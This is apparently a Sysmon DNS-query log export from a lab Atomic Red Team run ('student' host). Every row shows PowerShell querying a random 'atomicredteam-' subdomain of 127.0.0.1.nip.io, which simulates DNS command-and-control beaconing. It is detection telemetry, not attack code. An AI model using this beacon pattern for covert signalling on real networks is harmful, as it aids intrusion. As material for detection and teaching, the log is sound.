"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174389,"Query: atomicredteam-452074.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.352","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174390,"Query: atomicredteam-946132.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.391","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174391,"Query: atomicredteam-490634.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.440","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174392,"Query: atomicredteam-959418.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.484","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174393,"Query: atomicredteam-502444.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.526","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174394,"Query: atomicredteam-640781.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.572","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174395,"Query: atomicredteam-602937.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.624","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174396,"Query: atomicredteam-117543.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.663","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174397,"Query: atomicredteam-98281.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.703","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174398,"Query: atomicredteam-889260.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.873","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174399,"Query: atomicredteam-235974.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.918","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174400,"Query: atomicredteam-11819.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.956","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174401,"Query: atomicredteam-45674.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.995","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174402,"Query: atomicredteam-530918.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.041","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174403,"Query: atomicredteam-449482.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.102","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.583 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174404,"Query: atomicredteam-980577.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.217","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.584 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174405,"Query: atomicredteam-314065.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.283","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.584 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174406,"Query: atomicredteam-549323.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.323","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:12.584 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174407,"Query: atomicredteam-832491.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.545 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174408,"Query: atomicredteam-284195.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.398","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.545 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174409,"Query: atomicredteam-398269.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.437","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.545 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174410,"Query: atomicredteam-899346.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.648","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.545 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174411,"Query: atomicredteam-104558.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.694","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.561 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174412,"Query: atomicredteam-235622.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.561 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174413,"Query: atomicredteam-315873.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:12.801","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:13.561 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174414,"Query: atomicredteam-384354.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.124","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174415,"Query: atomicredteam-934201.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.167","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174416,"Query: atomicredteam-492975.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.336","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174417,"Query: atomicredteam-300644.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.376","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174418,"Query: atomicredteam-409452.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.415","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174419,"Query: atomicredteam-46841.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.469","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174420,"Query: atomicredteam-590334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174421,"Query: atomicredteam-712507.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.561","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174422,"Query: atomicredteam-523248.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.605","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174423,"Query: atomicredteam-132955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.645","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174424,"Query: atomicredteam-389451.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174425,"Query: atomicredteam-192961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.772","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174426,"Query: atomicredteam-309336.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174427,"Query: atomicredteam-254879.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:13.872","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174428,"Query: atomicredteam-282825.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.194","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174429,"Query: atomicredteam-673798.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.231","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:14.595 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174430,"Query: atomicredteam-169477.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.274","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.567 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174431,"Query: atomicredteam-180447.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.474","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.567 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174432,"Query: atomicredteam-183648.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.544","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174433,"Query: atomicredteam-270207.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.596","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174434,"Query: atomicredteam-393796.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.640","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174435,"Query: atomicredteam-695241.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.678","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174436,"Query: atomicredteam-594596.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.718","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
